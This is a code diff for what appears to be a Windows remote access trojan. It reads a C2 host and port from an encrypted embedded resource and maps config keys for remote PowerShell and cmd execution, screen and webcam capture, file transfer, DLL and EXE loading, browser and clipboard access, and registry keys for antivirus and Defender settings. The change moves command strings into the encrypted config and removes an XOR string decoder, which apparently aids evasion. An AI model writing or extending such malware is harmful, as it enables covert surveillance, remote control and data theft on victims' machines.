@@ -82,7 +82,7 @@ void str_trim(char* s) {
 extern SessionKey g_session;
 
 void sock_send(SOCKET sock, HANDLE mutex, const char* msg) {
-    sock_send_ex(sock, mutex, "response", msg);
+    sock_send_ex(sock, mutex, g_conf.s_response, msg);
 }
 
 void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg) {
@@ -289,8 +289,7 @@ void get_formatted_time(unsigned long long secs, char* out_buf) {
     sprintf(out_buf, "%02llu.%02llu.%llu %02llu:%02llu", days + 1, month, year, hour, minute);
 }
 
-char g_host[256] = {0};
-int g_port = 0;
+Config g_conf = {0};
 
 void load_config_from_resource() {
     HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
@@ -330,9 +329,7 @@ void load_config_from_resource() {
     BYTE ivCopy[16];
     memcpy(ivCopy, iv, 16);
 
-    // Get plain text size
     if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, NULL, 0, &cbPlain, 0) != 0) {
-        // Fallback for no padding
         cbPlain = (DWORD)config_len;
     }
 
@@ -344,8 +341,61 @@ void load_config_from_resource() {
         if (root) {
             cJSON* ip = cJSON_GetObjectItem(root, "ip");
             cJSON* port = cJSON_GetObjectItem(root, "port");
-            if (ip) strncpy(g_host, ip->valuestring, sizeof(g_host) - 1);
-            if (port) g_port = port->valueint;
+            if (ip) strncpy(g_conf.host, ip->valuestring, sizeof(g_conf.host) - 1);
+            if (port) g_conf.port = port->valueint;
+
+            #define MAP_STR(f, n) { cJSON* item = cJSON_GetObjectItem(root, n); if(item) strncpy(g_conf.f, item->valuestring, sizeof(g_conf.f)-1); }
+            MAP_STR(s_ping, "s_ping");
+            MAP_STR(s_pong, "s_pong");
+            MAP_STR(s_msg, "s_msg");
+            MAP_STR(s_exec_ps, "s_exec_ps");
+            MAP_STR(s_exec_cmd, "s_exec_cmd");
+            MAP_STR(s_ps_out, "s_ps_out");
+            MAP_STR(s_cmd_out, "s_cmd_out");
+            MAP_STR(s_scr_stop, "s_scr_stop");
+            MAP_STR(s_cam_stop, "s_cam_stop");
+            MAP_STR(s_tasklist, "s_tasklist");
+            MAP_STR(s_taskkill, "s_taskkill");
+            MAP_STR(s_ls, "s_ls");
+            MAP_STR(s_ls_res, "s_ls_res");
+            MAP_STR(s_download, "s_download");
+            MAP_STR(s_delete, "s_delete");
+            MAP_STR(s_mkdir, "s_mkdir");
+            MAP_STR(s_upload, "s_upload");
+            MAP_STR(s_rename, "s_rename");
+            MAP_STR(s_rfe_exe, "s_rfe_exe");
+            MAP_STR(s_rfe_dll, "s_rfe_dll");
+            MAP_STR(s_browser, "s_browser");
+            MAP_STR(s_clip_get, "s_clip_get");
+            MAP_STR(s_clip_set, "s_clip_set");
+            MAP_STR(s_uninstall, "s_uninstall");
+            MAP_STR(s_close, "s_close");
+            MAP_STR(s_reconnect, "s_reconnect");
+            MAP_STR(s_set_delay, "s_set_delay");
+            MAP_STR(s_scr_start, "s_scr_start");
+            MAP_STR(s_cam_start, "s_cam_start");
+            MAP_STR(s_sysinfo, "s_sysinfo");
+            MAP_STR(s_response, "s_response");
+            MAP_STR(s_command, "s_command");
+            MAP_STR(s_session, "s_session");
+
+            MAP_STR(s_reg_win_key, "s_reg_win_key");
+            MAP_STR(s_reg_prod_name, "s_reg_prod_name");
+            MAP_STR(s_reg_build, "s_reg_build");
+            MAP_STR(s_reg_display, "s_reg_display");
+            MAP_STR(s_reg_release, "s_reg_release");
+            MAP_STR(s_reg_av_key, "s_reg_av_key");
+            MAP_STR(s_reg_defender_key, "s_reg_defender_key");
+            MAP_STR(s_reg_dis_spy, "s_reg_dis_spy");
+            MAP_STR(s_reg_gpu_key, "s_reg_gpu_key");
+            MAP_STR(s_reg_gpu_desc, "s_reg_gpu_desc");
+            MAP_STR(s_reg_cpu_key, "s_reg_cpu_key");
+            MAP_STR(s_reg_cpu_name, "s_reg_cpu_name");
+
+            MAP_STR(s_http_ua, "s_http_ua");
+            MAP_STR(s_http_host, "s_http_host");
+            MAP_STR(s_http_path, "s_http_path");
+
             cJSON_Delete(root);
         }
     }
@@ -355,25 +405,4 @@ cleanup:
     if (hKey) BCryptDestroyKey(hKey);
     if (pbKeyObject) free(pbKeyObject);
     if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
-}
-
-#ifdef _MSC_VER
-#define TLS __declspec(thread)
-#else
-#define TLS __thread
-#endif
-
-const char* x(const unsigned char* data, int len, unsigned char key) {
-    static TLS char pools[8][1024];
-    static TLS int pool_idx = 0;
-
-    char* buf = pools[pool_idx];
-    pool_idx = (pool_idx + 1) % 8;
-
-    if (len > 1023) len = 1023;
-    for (int i = 0; i < len; i++) {
-        buf[i] = (char)(data[i] ^ key);
-    }
-    buf[len] = '\0';
-    return buf;
 }
